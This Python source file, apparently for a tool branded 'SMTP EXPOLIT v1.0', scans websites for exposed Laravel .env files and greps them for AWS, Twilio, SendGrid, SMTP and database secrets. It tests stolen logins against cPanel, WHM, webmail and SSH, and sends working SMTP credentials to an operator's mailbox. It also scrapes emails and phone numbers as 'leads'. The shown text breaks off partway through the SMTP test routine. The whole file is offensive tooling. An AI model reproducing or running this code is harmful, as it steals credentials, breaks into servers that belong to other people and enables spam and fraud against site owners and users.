#============== Moudles ===============#
#Don't Touch Anything if you don't know what your doing?
import os
import re
import ssl
import sys
import time
import rich
import json
import hmac
import codecs
import boto3
import shutil
import socket
import hashlib
import random
import base64
import vonage
import pymysql
import paramiko
import warnings
import datetime
import requests
import ipaddress
import traceback
import email.utils
import configparser
import email.message
from queue import Queue
import smtplib, urllib3
from platform import system
from threading import Thread

import tkinter as tk
from tkinter import filedialog

import concurrent.futures
import threading

from ipranger import generate
from typing import List
from time import sleep
from re import findall as Fregx
import pydomainextractor
from random import randint, choice

from datetime import date, datetime
from email.utils import formataddr
from bs4 import BeautifulSoup

from rich.console import Console
from rich.prompt import Prompt

from urlextract import URLExtract

from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Pool

socket.setdefaulttimeout(7)
requests.packages.urllib3.disable_warnings()

from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)

paramiko.util.log_to_file("log.txt", level = "INFO")

from urllib.parse import urlparse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from twilio.rest import Client

from smtplib import SMTP, SMTP_SSL, SMTPException, SMTPSenderRefused, SMTPNotSupportedError, SMTPConnectError, \
SMTPHeloError, SMTPAuthenticationError, SMTPRecipientsRefused, SMTPDataError, SMTPServerDisconnected, \
SMTPResponseException
#============ Create Folder ===============#
try:
	os.mkdir('Results')
except:
	pass

from colorama import Fore, Back, init, Style
import boto3
import json
import requests
from botocore.exceptions import ClientError

init(autoreset=True)

red = Fore.RED
green = Fore.GREEN
cyan = Fore.CYAN
white = Fore.WHITE
yellow = Fore.YELLOW
dim = Style.DIM
normal = Style.NORMAL
bright = Style.BRIGHT
blue = Fore.BLUE
light_red = Fore.LIGHTRED_EX
#============== CONFIG ===============#

blacklist = ["schema.org", "bitverzo.com", "com.ar","opengraphprotocol.org","facebook.com","fonts.googleapis.com","ajax.googleapis.com","dnsdaquan.com" ,"rdnsdb.com", "api.cn","cdn.staticfile.org", "ipchaxun.com", "window.top", "xploredomains.com", "pagead2.googlesyndication.com","google.com", "w3.org", "StatsNode.com", "?ip=", "webiplookup.com", "chapangzhan.com", "googletagmanager.com", "whatsapp.com", "adsbygoogle.js", "hm.js?2f00f817a5627fb963606d137649896e"]
laravel_paths = ['/.env', '/.local', '/env','/.remote', '/.production', '/vendor/.env',
'/cronlab/.env', '/cron/.env', '/core/.env', '/core/app/.env', '/core/Datavase/.env',
'/database/.env', '/config/.env', '/assets/.env', '/app/.env', '/apps/.env',
'/uploads/.env', '/sitemaps/.env', '/saas/.env', '/api/.env', '/psnlink/.env',
'/exapi/.env', '/site/.env', '/admin/.env', '/web/.env', '/public/.env', '/en/.env',
'/tools/.env', '/v1/.env', '/v2/.env', '/administrator/.env', '/laravel/.env',
'/storage/.env', "/__tests__/test-become/.env", "/redmine/.env",
"/api/.env", "/gists/cache", "/uploads/.env", "/backend/.env",
"/.env.example", "/database/.env", "/main/.env", "/docs/.env", "/client/.env",
"/blog/.env", "/.env.dev", "/blogs/.env", "/shared/.env", "/download/.env",
"/.env.php", "/site/.env", "/sites/.env",
":8443/.env", "/env.save", "/locally/.env", "/production/.env", "/localhost/.env", "/test/.env", 
"/developer/.env", "/development/.env", "/stag/.env", "/staging/.env", "/prod/.env", "/platform/.env"
'/conf/.env','/wp-content/.env','/wp-admin/.env','/library/.env',
'/new/.env','/old/.env','/local/.env','/crm/.env','/admin/.env','/laravel/.env','/app/config/.env',
'/audio/.env','/cgi-bin/.env','/src/.env','/base/.env','/core/.env','/vendor/laravel/.env',
'/storage/.env','/protected/.env','/newsite/.env','/www/.env','/sites/all/libraries/mailchimp/.env','/database/.env','/public/.env'
]

DB_MANAGER = ['/adminer.php','/Adminer.php','/phpmyadmin', "/PMA/index.php"]


xxxHOSTXX = ''
xxxPORTXX = 587

cfg = configparser.ConfigParser()
try:
	cfg.read('settings.ini')
	cfg.sections()
	Check_Smtp = cfg['SETTINGS']['CHECK_SMTP']
	Check_Cpanel = cfg['SETTINGS']['CHECK_CPANEL']
	Check_WHM = cfg['SETTINGS']['CHECK_WHM']
	Check_VPS = cfg['SETTINGS']['CHECK_VPS']
	Check_Webmails = cfg['SETTINGS']['CHECK_WEBMAILS']
	CHECK_E2S = cfg['SETTINGS']['EMAIL_SMS_TEST']
	send_sms_to = cfg['SETTINGS']['PHONE_NUMBER']
	EXTRACTOR = cfg['SETTINGS']['EXTRACT_DATA']
except Exception as e:
	cfg['SETTINGS'] = {}
	cfg['SETTINGS']['CHECK_SMTP'] = 'on'
	cfg['SETTINGS']['CHECK_CPANEL'] = 'on'
	cfg['SETTINGS']['CHECK_WHM'] = 'on'
	cfg['SETTINGS']['CHECK_VPS'] = 'on'
	cfg['SETTINGS']['CHECK_WEBMAILS'] = 'on'
	cfg['SETTINGS']['EMAIL_SMS_TEST'] = 'on'
	cfg['SETTINGS']['PHONE_NUMBER'] = 'number@gateway'
	cfg['SETTINGS']['EXTRACT_DATA'] = 'on'

	with open('settings.ini', 'a+') as config:
		cfg.write(config)

Check_Smtp = cfg['SETTINGS']['CHECK_SMTP']
Check_Cpanel = cfg['SETTINGS']['CHECK_CPANEL']
Check_WHM = cfg['SETTINGS']['CHECK_WHM']
Check_VPS = cfg['SETTINGS']['CHECK_VPS']
Check_Webmails = cfg['SETTINGS']['CHECK_WEBMAILS']
CHECK_E2S = cfg['SETTINGS']['EMAIL_SMS_TEST']
send_sms_to = cfg['SETTINGS']['PHONE_NUMBER']
EXTRACTOR = cfg['SETTINGS']['EXTRACT_DATA']

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''

keywords = [
"NEXMO", "NEXMO_KEY",
"SENDGRID",
"AWS_ACCESS=", "SQS_KEY", "SQS_ACCESS_KEY","AWS_S3=","AWS_SES=","AWS_SECRET="
"AWS_SNS", "SNS_KEY", "SNS_ACCESS_KEY",
"AWS_S3", "S3_ACCESS_KEY", "S3_KEY",
"AWS_SES", "SES_ACCESS_KEY", "SES_KEY",
"AWS_KEY", "AWS_ACCESS_KEY",
"DYNAMODB_ACCESS_KEY", "DYNAMODB_KEY",
"AWS.config.accessKeyId",
"AWSACCESSKEYID:",
"AWSSecretKey",
"TWILIO", "twilio",
"AWS_SES_ACCESS_KEY_ID"
"VONAGE_KEY", "VONAGE_API", "VONAGE",
"vonage_key", "vonage_api", "vonage",
"account_sid", "ACCOUNT_SID",
"django", "python",
"email-smtp",
"sk_live", "pk_live",
"aws_access_key_id",
"APP_ENV",
"DB_PASSWORD=",
"TWILIO_SID",
"TWILIO_SID=",
"ACCOUNT_SID",
"NEXMO_KEY",
"MAILGUN",
"MAIL_USERNAME=",
"AWS",
"APP_KEY",
"APP_URL",
"APP_KEY=",
"APP_URL=",
"DB_PASSWORD",
"SMTP_HOST", "MAIL_USERNAME", "MAIL_PASSWORD"
]

smtp_hosts = ['.amazonaws.com','sendgrid','office365','1and1','1und1','zoho','mandrillapp','mailgun','.it','.jp','emailsrvr','.yandex','.OVH','.ionos','zimbra','kasserver.com','gmoserver','sparkpostmail.com','smtp-relay.gmail','gmail.com','googlemail','hetzner','Aliyun','att.net','chinaemail','comcast','cox.net','earthlink','global-mail','gmx','godaddy','mimecast','NetworkSolutions','outlook','sendinblue']

Headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}
alias = {i[0].upper(): i[1] for i in keywords if not isinstance(i, str)}
xreg = re.compile(
	r"|".join(re.escape(i if isinstance(i, str) else i[0]) for i in keywords), re.I)
#============== FUNCTIONS ===============#
console = Console()
now = datetime.now()
current_time = now.strftime('%H:%M:%S')
Today = datetime.now().strftime("%Y-%m-%d")

def set_title(console_title):
	os.system(f"title {console_title}")

def clrscr():
	os.system('cls' if os.name == 'nt' else 'clear')

def ascii():
	clrscr()
	os.system('title SMTPEX v1.0 - Rebuild')
	"""Prints the ascii logo"""
	console.print(f"""[red1]

██████   ███▄ ▄███▓▄▄▄█████▓ ██▓███      ▓█████▒██   ██▒ ██▓███   ▒█████   ██▓     ██▄▄▄█████▓
▒██    ▒  ▓██▒▀█▀ ██▒▓  ██▒ ▓▒▓██░  ██     ▓█   ▀▒▒ █ █ ▒░▓██░  ██ ▒██▒  ██▒▓██▒   ▒▓██▓  ██▒ ▓▒
░ ▓██▄    ▓██    ▓██░▒ ▓██░ ▒░▓██░ ██▓▒    ▒███  ░░  █   ░▓██░ ██▓▒▒██░  ██▒▒██░   ░▒██▒ ▓██░ ▒░
	▒   ██▒ ▒██    ▒██ ░ ▓██▓ ░ ▒██▄█▓▒ ▒    ▒▓█  ▄ ░ █ █ ▒ ▒██▄█▓▒ ▒▒██   ██░▒██░    ░██░ ▓██▓ ░ 
▒██████▒▒▒▒██▒   ░██▒  ▒██▒ ░ ▒██▒ ░  ░    ░▒████▒██▒ ▒██▒▒██▒ ░  ░░ ████▓▒░░██████ ░██  ▒██▒ ░ 
▒ ▒▓▒ ▒ ░░░ ▒░   ░  ░  ▒ ░░   ▒▓▒░ ░  ░    ░░ ▒░ ▒▒ ░ ░▓ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▓   ░▓   ▒ ░░   
░ ░▒  ░  ░░  ░      ░    ░    ░▒ ░          ░ ░  ░░   ░▒ ░░▒ ░       ░ ▒ ▒░ ░ ░ ▒    ▒     ░    
░  ░  ░   ░      ░     ░ ░    ░░              ░   ░    ░  ░░       ░ ░ ░ ▒    ░ ░    ▒   ░ ░    
			░  ░       ░                            ░   ░    ░               ░ ░      ░    ░          
			
							~ SMTP EXPOLIT v1.0 [/red1]
							<[green] We Stand with Palestine [/green]>

[red1]~[/red1] [blue1]Telegram[/blue1] : [red1]@WeedyDev [/red1]
[red1]~[/red1] [blue1]Channel[/blue1] : [cyan]https://t.me/+I-FfbhSk3ug2MmZl[/cyan]
[red1]~[/red1] [red1]Warning[/red1] : [red1]I am Not Responsible for Any Damage Caused.[/red1]""")

def choose_file():
	root = tk.Tk()
	root.withdraw()
	file_path = filedialog.askopenfilename(title="Choose the File")
	return file_path

def get_toaddr():
	with open('sendto.ini', 'r') as file:
		content = file.read()
	return content.strip()

toaddr = get_toaddr() #Retrive To address From Sendto.ini file

def get_random_string():
	result_str = ''.join(random.choice(string.ascii_lowercase) for i in range(5))
	return result_str

def remove_quotes(line):
	return line.replace('"', '').replace("'", '')

def is_valid_info(line):
	values = line.split('|')
	count_dash_null_none = 0
	for value in values:
		if value in ('-', 'null', 'None'):
			count_dash_null_none += 1
	if count_dash_null_none > 2:
		return False
	if len(line) < 5:
		return False
	return True

def is_valid_data(content):
	if content.endswith((".js", ".css", ".html", ".png", ".ico")):
		return False

	try:
		ipaddress.ip_address(content)
		return True
	except ValueError:
		pass

	#Check if the content is a valid domain name
	pattern = r'^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$'
	if re.match(pattern, content):
		return True
	else:
		return False

def join_string(str_value):
	return "".join([str(item) for item in str_value])

def get_param(text, pattern):
	try:
		x = remove_quotes(re.findall(pattern, text)[0])
		return x.strip() if len(x) > 2 else '-'
	except:
		return '-'

def find_between(s, first, last):
	try:
		start = s.index(first) + len(first)
		end = s.index(last, start)
		return s[start:end]
	except ValueError:
		return None

def xSave(folder, filename, content):
	try:
		if not os.path.exists(os.path.join('Results', folder)):
			os.makedirs(os.path.join('Results', folder))
		ext = '.txt'
		file_path = os.path.join('Results', folder, filename+ext)

		with open(file_path, 'a+') as file:
			file.write(content.strip() + '\n')
	except:
		pass

def save_list_to_file(folder, filename, content):
	if not os.path.exists(os.path.join('Results', folder)):
		os.makedirs(os.path.join('Results', folder))
	ext = '.txt'
	file_path = os.path.join('Results', folder, filename+ext)

	with open(file_path, 'a+') as file:
		for line in content:
			file.write(line + '\n')

def display_array(arr):
	for item in arr:
		console.print(item, style = 'green')

def clean_domain(url):
	url = str(url)
	if url.startswith("http://"):
		url = url.replace("http://", "")
	elif url.startswith("https://"):
		url = url.replace("https://", "")
	if "www." in url:
		url = url.replace("www.", "")
	if "/" in url:
		url = url.rstrip()
		url = url.split("/")[0]
	return str(url)

def domain_to_ip(domain_name):
	try:
		ip_address = socket.gethostbyname(clean_domain(domain_name))
		console.print(ip_address)
		xSave("Domain To IP", f"Domain To IP - {Today}", ip_address)
		return ip_address
	except socket.gaierror:
		return None

def is_valid_cidr_range(cidr):
	pattern = r'^(\d{1,3}\.){3}\d{1,3}/\d{1,2}$'
	if re.match(pattern, cidr):
		return True
	else:
		return False

def add_protocol(site_url):
	site_url = str(site_url)
	if site_url.startswith('http://'):
		site_url = site_url.replace('http://', '')
		protocol = 'http://'
	elif site_url.startswith('https://'):
		site_url = site_url.replace('https://', '')
		protocol = 'https://'
	else:
		protocol = 'http://'
	if '/' in site_url:
		site_url = site_url.rstrip().split('/')[0]
	return '{}{}'.format(protocol, site_url)

def get_current_date():
	current_date = now.strftime("%Y-%m-%d")
	return current_date

def check_date_format(date_str):
	if date_str.lower() == "today":
		return datetime.now().strftime("%Y-%m-%d")
	else:
		pattern = "^20\d{2}-[01]\d-[0-3]\d$"
		if re.match(pattern, date_str):
			return date_str
		else:
			return datetime.now().strftime("%Y-%m-%d")

def get_website_content(url):
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Connection": "keep-alive",
		"Upgrade-Insecure-Requests": "1"
	}

	try:
		response = requests.get(url, headers=headers, timeout=5, verify=False)
		if response.status_code == 200:
			return response.content.decode('utf-8')
		else:
			return response.text
	except:
		return None

def find_db_manager(target_url, db_host, db_port ,db_user, db_pass, db_name):
	try:
		for path in DB_MANAGER:
			DB_URI = "".join([add_protocol(clean_domain(target_url)), path])
			x = get_website_content(DB_URI)
			if "phpmyadmin.net" in x:
				console.print(f"Found phpmyadmin ==> {DB_URI}", style="blue")
				build_format = f"#URL : {DB_URI}\n#HOST : {db_host}\n#PORT : {db_port}\n#DB_NAME : {db_name}\n#USER : {db_user}\n#PASSWORD : {db_pass}\n"
				xSave("Cracked", "phpmyadmin.net", build_format)
			elif "Login - Adminer" in x:
				console.print(f"Found Adminer ==> {DB_URI}", style="blue")
				build_format = f"#URL : {DB_URI}\n#HOST : {db_host}\n#PORT : {db_port}\n#DB_NAME : {db_name}\n#USER : {db_user}\n#PASSWORD : {db_pass}\n"
				xSave("Cracked", "Adminer", build_format)
	except Exception as e:
		pass

def isvalid_domain(domain_name):
	domain_name = clean_domain(domain_name)
	domain_extractor = pydomainextractor.DomainExtractor()
	return domain_extractor.is_valid_domain(domain_name)

def extract_domains(content):
	pattern = r"(https?://)?(www\.)?([^\s/]+\.[^\s/]+)"
	domains = []
	for url in content:
		matches = re.findall(pattern, url)
		for match in matches:
			domain = match[2].replace("www.", "").rstrip("/")
			if domain not in blacklist and is_valid_data(domain) != False:
				domains.append(domain)
	return list(set(domains))

def extract_base_urls(base_url):
	try:
		extractor = URLExtract()
		base_extract = extractor.find_urls(get_website_content(base_url))
		return extract_domains(base_extract)
	except Exception as e:
		#console.print(e)
		return None

def filter_crt(content_array):
	subdomains = []
	for line in content_array:
		if "<" in line:
			line = re.findall('(?:)(.*?)<', line)[0]
		if (line not in subdomains and " " not in line
				and '@' not in line):
			if '*' in line:
				line = line.split("*.")[1]
			subdomains.append(line)
	return subdomains

def is_valid_subdomain(subdomain):
	#Check if subdomain contains only valid characters
	if re.match("^[a-zA-Z0-9-_.]+$", subdomain):
		return True
	return False

def get_subdomains(site_link):
	website_url = f'https://crt.sh/?q=%25.{clean_domain(site_link)}'
	first_content = str(get_website_content(website_url))

	first_subdomains_td = re.findall('(?:<TD>)(.*?)</TD>', first_content)
	first_output_first_filter = filter_crt(first_subdomains_td)

	first_subdomains_br = re.findall('(?:BR>)(.*?)<', first_content)
	first_output_second_filter = filter_crt(first_subdomains_br)

	subdomains = []
	for s in first_output_first_filter + first_output_second_filter:
		if s not in subdomains:
			subdomains.append(s)
	valid_subdomains = [s for s in subdomains if is_valid_subdomain(s)]
	display_array(valid_subdomains)
	save_list_to_file("Subdomains", f"SubDomains - {Today}", valid_subdomains)
	return valid_subdomains

def cidr_ranger(cidr_range):
	ip_addresses = []
	for ip in generate(include_list = [cidr_range]):
		ip_addresses.append(str(ip))
	return ip_addresses

def grab_by_domain1(date_str, limit):
	try:
		date = check_date_format(date_str)
		for i in range(1, limit):
			base_url = "https://xploredomains.com/{}?page={}".format(date, int(i))
			domains = extract_base_urls(base_url)
			display_array(domains)
			save_list_to_file("generated", f"Auto Grab By Date - {Today}", domains)
	except Exception as e:
		#console.print(f"[-] Error Found {e}")
		pass

	return True

"""
def ip_to_domain(ip_address):
	try:
		for i in range(1, 20):
			base_url = "https://www.statsnode.com/reverse-ip-lookup/{}/page-{}/".format(ip_address, i)
			domains = extract_base_urls(base_url)
			display_array(domains)
			save_list_to_file("generated", f"ReverseIP Server 1 - {Today}", domains)
	except Exception as e:
		console.print(f"[-] Error Found {e}")
		pass

	return True
"""

def ip_to_domains3(ip_address):
	try:
		base_url = "https://ipchaxun.com/{}/".format(ip_address)
		domains = extract_base_urls(base_url)
		display_array(domains)
		save_list_to_file("Reverse IP", f"ReverseIP Server 3 - {Today}", domains)
	except Exception as e:
		console.print(f"[-] Error Found {e}")
		pass

	return True

def ip_to_domains2(ip_address):
	try:
		base_url = "https://webiplookup.com/{}/".format(ip_address)
		domains = extract_base_urls(base_url)
		display_array(domains)
		save_list_to_file("Reverse IP", f"ReverseIP Server 1 - {Today}", domains)
	except Exception as e:
		#console.print(f"[-] Error Found {e}")
		pass

	return True

def ip2domain_cidr(cidr_range):
	try:
		all_domains = []
		for ip in generate(include_list = [cidr_range]):
			base_url = "https://ipchaxun.com/{}/".format(ip)
			domains = extract_base_urls(base_url)
			all_domains += domains
			display_array(all_domains)
			save_list_to_file("generated", f"IP2CIDR - {cidr_range}", domains)
	except Exception as e:
		#console.print(f"[-] Error Found {e}")
		pass

	return True

"""
def ip2domain3(ip_address):
	base_url = "https://domains.tntcode.com/ip/{}/".format(ip_address)
	domains = extract_domains(get_website_content(base_url))
	display_array(domains)
	save_list_to_file("Reverse IP", "IP2DOMAIN-3", domains)
	return domains
"""

def test_revip(ip_address):
	try:
		base_url = "https://scrapestack.com/scrape_api.php?url=https://otx.alienvault.com/otxapi/indicator/ip/passive_dns/{}".format(ip_address)
		json_data = json.loads(get_website_content(base_url).replace('&quot;', '"'))
		domains_list = []
		if json_data['count'] != 0:
			count = json_data['count']
			for i in range(count):
				hostname = json_data["passive_dns"][i]["hostname"]
				domains_list.append(hostname)
		display_array(domains_list)
		save_list_to_file("Reverse IP", f"ReverseIP 2 - {Today}", list(set(domains_list)))
	except:
		pass
	
	return True

def domain_grabber1(limit):
	try:
		for i in range(1, int(limit)):
			base_url = f"https://www.uidomains.com/browse-daily-domains-difference/{i}"
			domains = extract_base_urls(base_url)
			display_array(domains)
			save_list_to_file("generated", f"Auto Grab Domains - {Today}", domains)
	except Exception as e:
		#console.print(f"[-] Error Found {e}")
		pass
	
	return True

def ips_grabber1(limit):
	try:
		all_ips = []
		for i in range(1, int(limit)):
			base_url = f"http://bitverzo.com/recent_ip?p={i}"
			ips = extract_base_urls(base_url)
			all_ips = all_ips + ips
			display_array(ips)
			save_list_to_file("generated", f"Auto grab IPS - {Today}", list(set(all_ips)))
	except Exception as e:
		#console.print(f"[-] Error Found {e}")
		pass
	
	return True

def http_port_scanner(ip_url):
	target_url = "http://{}".format(clean_domain(ip_url))
	try:
		headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Connection": "keep-alive",
		"Upgrade-Insecure-Requests": "1",
		"Cache-Control": "max-age=0",
		"TE": "Trailers",
		}
		response_url = requests.get(url=target_url, headers=headers, timeout=5, verify=False)
		if response_url.status_code < 600:
			console.print(f'[+] Live {target_url}', style='green')
			xSave("HTTP Scanner", "Live HTTP", target_url)
		else:
			console.print(f'[+] Dead {target_url}', style='red')
			xSave("HTTP Scanner", "Dead HTTP", target_url)

	except:
		console.print(f'[+] Dead {target_url}', style='red')
		xSave("HTTP Scanner", "Dead HTTP", target_url)

def gen_check(limit):
	for i in range(0, limit):
		ip_address = ".".join(str(random.randint(0, 255)) for _ in range(4))
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(5)
		result = sock.connect_ex((ip_address, 80))
		if str(result) != '0':
			console.print(f'[-] BAD IP {ip_address}:80', style='red')
			xSave("generated", "Random IP-Dead", ip_address)
		if str(result) == '0':
			console.print(f'[+] Live IP {ip_address}:80', style='green')
			xSave("generated", "Random IP-Live", ip_address)
	
	return True

def extract_ip_prefixes(json_data):
	ip_prefixes = []
	for prefix in json_data['prefixes']:
		if 'ip_prefix' in prefix:
			ip_prefix = prefix['ip_prefix']
			ip_prefixes.append(ip_prefix)
	return ip_prefixes

def checker_whm(line):
	url, host, username, password = line.strip().split("|")
	try:
		headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
		s = requests.Session()
		data = {"user":username,"pass":password}
		resp = s.post(f"{add_protocol(url)}:2087/login", data=data, headers=headers, verify=False, allow_redirects=False, timeout=7).text
		check_format = f"{add_protocol(url)}:2087/|{username}|{password}"
		if "security_token" in resp:
			console.print(f"[+] WHM-Live Login => {check_format}", style="green")
			xSave("Cracked", "WHM-Live", check_format)
			return True
		else:
			console.print(f"[-] WHM-Dead Login => {check_format}", style="red")
			xSave("Cracked", "WHM-Dead", check_format)
			return False
	except Exception as e:
		return False

def checker_cpanel(line):
	url, host, username, password = line.strip().split("|")
	try:
		headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
		s = requests.Session()
		data = {"user":username,"pass":password, 'login_submit': 'Log in', 'goto_uri': '/'}
		resp = s.post(f"{add_protocol(url)}:2083/login/?login_only=1", data=data, verify=False, allow_redirects=False, headers=headers, timeout=5).text
		check_format = f"{add_protocol(url)}:2083/|{username}|{password}"
		if "security_token" in resp:
			console.print(f"[+] CPanel-Live Login => {check_format}", style="green")
			xSave("Cracked", "CPanel-Live", check_format)
			return True
		else:
			console.print(f"[-] CPanel-Dead Login => {check_format}", style="red")
			xSave("Cracked", "CPanel-Dead", check_format)
			return False
	except Exception as e:
		return False

def checker_webmail(line):
	url, host, username, password = line.strip().split("|")
	try:
		session = requests.Session()
		r = session.get(f"{add_protocol(url)}:2096/", timeout=7, verify=False)
		headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
		check_format = f"{add_protocol(url)}:2096/|{username}|{password}"

		try:
			response = session.post(f"{r.url}login/?login_only=1", data={"user": username, "pass": password, 'goto_uri': '%2F3rdparty%2Froundcube%2F%3F_task%3Dmail%26_mbox%3DINBOX'}, timeout=7, headers=headers, verify=False)
		except:
			return False

		if "security_token" in response.text:
			console.print(f"[+] Webmail Login Live => {check_format}", style="green")
			xSave("Cracked", "Live-Webmails", check_format)
			return True 
		else:
			console.print(f"[-] Webmail Login Dead => {check_format}", style="red")
			xSave("Cracked", "Dead-Webmails", check_format)
			return False
	except:
		return False

def check_vps_details(line):
	hostname, username, password = line.strip().split("|")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	check_format = f"{hostname}|22|{username}|{password}"
	try:
		ssh.connect(hostname, 22, username=username, password=password, timeout=30)
		stdin, stdout, stderr = ssh.exec_command('ls -l')
		print(stdout.read().decode())
		ssh.close()
		console.print(f"[+] VPS Live Cracked ==> {check_format}", style="green")
		xSave("Cracked", "VPS-Live", check_format)
		return True
	except:
		console.print(f"[-] VPS DEAD ==> {check_format}", style="red")
		xSave("Cracked", "VPS-DEAD", check_format)
		return False

def grabber_aws():
	base_url = "https://ip-ranges.amazonaws.com/ip-ranges.json"
	aws_data = get_website_content(base_url)
	data = json.loads(aws_data)
	ip_prefixes = extract_ip_prefixes(data)
	for x in ip_prefixes:
		display_array(cidr_ranger(x))
		save_list_to_file("Fresh IPs Amazon", "AWS-IPRANGES", cidr_ranger(x))

def extract_details_e2c(json_data):
	details = []
	for prefix in json_data['prefixes']:
		if 'region' in prefix and 'ip_prefix' in prefix:
			region = prefix['region']
			ip_prefix = prefix['ip_prefix']
			details.append({'region': region, 'ip_prefix': ip_prefix})
	return details

def grabber_aws_sites():
	base_url = "https://ip-ranges.amazonaws.com/ip-ranges.json"
	aws_data = get_website_content(base_url)
	data = json.loads(aws_data)
	details = extract_details_e2c(data)

	for x in details:
		for i in cidr_ranger(x['ip_prefix']):
			mysite = f"ec2-{i.replace('.','-')}.{x['region']}.compute.amazonaws.com"
			console.print(mysite, style="green")
			xSave("Fresh Site Amazon", x['region'], mysite)

	return details

def grabber_asn(ASN):
	ip_prefixes = []
	r = requests.get(f"https://api.bgpview.io/asn/{ASN}/prefixes").json()
	ip_prefix = r['data']['ipv4_prefixes']
	for x in ip_prefix:
		ip_prefixes.append(x['prefix'])
		display_array(cidr_ranger(x['prefix']))
		save_list_to_file("generated", f"Grab By ASN-{ASN}", cidr_ranger(x['prefix']))

#https://ipinfo.io/countries/
def ipinfo_db(country):
	base_url = f"https://ipinfo.io/countries/{country}#section-asns"
	pattern = r'asn":"(\w+)"'
	r = get_website_content(base_url)
	matches = re.findall(pattern, r)
	display_array(matches)
	save_list_to_file("generated", f"{country}-ASN", matches)

def extract_emails(response):
	try:
		mails = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
		matches = re.findall(mails, response)

		if matches:
			for emails in list(set(matches)):
				if emails.endswith('.png'):
					return True

				console.print(f'[+] Extracted Email Leads From Site => {emails}', style='green')
				xSave("Extracted", "Emails", emails)
	except:
		pass

def extract_phone(response):
	try:
		phone = r'^(\+\d{1,2}\s?)?1?\-?\.?\s?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$'
		matches = re.findall(phone, response)
		if matches:
			for phone_numbers in matches:
				console.print(f'[+] Extracted Number Lead From Site => {phone_numbers}', style='green')
				xSave("Extracted", "Phone numbers", phone_numbers)
	except:
		pass

def extract_datas(response):
	try:
		extract_emails(response)
		extract_phone(response)
	except:
		pass

def is_alive(url):
	try:
		r = requests.get(url, timeout=3, allow_redirects=True)
		#Extractor To Extract Emails and Number Leads
		if EXTRACTOR == 'on':
			extract_datas(r.text)

		return r.status_code
	except Exception as e:
		return False

def is_wp(url):
	wp_path = ["/license.txt", "/wp-login.php"]
	try:
		for path in wp_path:
			wp_find = requests.get(url + path, headers=Headers, timeout=5).text
			if "WordPress" in wp_find.text:
				console.print(f'[+] WordPress Cms Detected ! => {url}', style='green')
				xSave("Filtered", "!WordPress", smtp)
				return True
	except:
		return False

def is_joomla(url):
	joomla_path = ["/README.txt", "/robots.txt"]
	try:
		for path in joomla_path:
			joomla_find = requests.get(url + path, headers=Headers, timeout=5).text
			if "Joomla" in joomla_find.text:
				console.print(f'[+] JOOMLA CMS Detected ! => {url}', style='green')
				xSave("Filtered", "!JOOMLA", smtp)
				return True
	except:
		return False

def cms_detect(url):
	try:
		is_wp()
		is_joomla()
	except:
		pass
#============== CX ===============#
class SMTPTEST:

    def __init__(self):
        self.today = date.today()
        self.now = datetime.now()
        self.send_to = toaddr

    def get_time(self):
        day = self.today.strftime("%d-%b-%Y")
        current_time = self.now.strftime("%H:%M")
        time = f"Date: {day} & Time: {current_time} "
        return str(time)

    def smtp_test(self, url, smtp_host, smtp_username, smtp_password, smtp_from, smtp_port):
        if smtp_from == '' or smtp_from == "" or str(smtp_from) == str("none") or "@" not in smtp_from:
            sender_email = str(smtp_username.replace('"', '').replace("'", ""))
        else:
            sender_email = str(smtp_from.replace('"', '').replace("'", ""))
        if smtp_port == "" or smtp_port == '' or smtp_port == "" or smtp_port == '' or int(smtp_port) == 465 or \
                int(smtp_port) == 25 or int(smtp_port) == 2525:
            smtp_port = 587
        smtp_server = str(smtp_host.replace('"', '').replace("'", ""))
        smtp_username = str(smtp_username.replace('"', '').replace("'", ""))
        smtp_password = str(smtp_password.replace('"', '').replace("'", ""))
        smtp_port = str(smtp_port).replace('"', '').replace("'", "")
        receiver_email = self.send_to
        message = MIMEMultipart('alternative')
        message[
            'Subject'] = f'{smtp_server}|{smtp_port}|{smtp_username}|{smtp_password}|{sender_email}'
        message['From'] = formataddr(("SMTPEX V1.3", sender_email))
        message['To'] = receiver_email
        text = 'This is A Test Generated By SMTPSERVER'
        html = f"<b>This is a Test Generated at {self.get_time()}<b>"
        part1 = MIMEText(text, 'plain')
        part2 = MIMEText(html, 'html')
        message.attach(part1)
        message.attach(part2)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        try:
            s = smtplib.SMTP(smtp_server, int(smtp_port), timeout=25)
            s.connect(smtp_server, smtp_port)
            s.ehlo()
            s.starttls(context=context)
            s.ehlo()
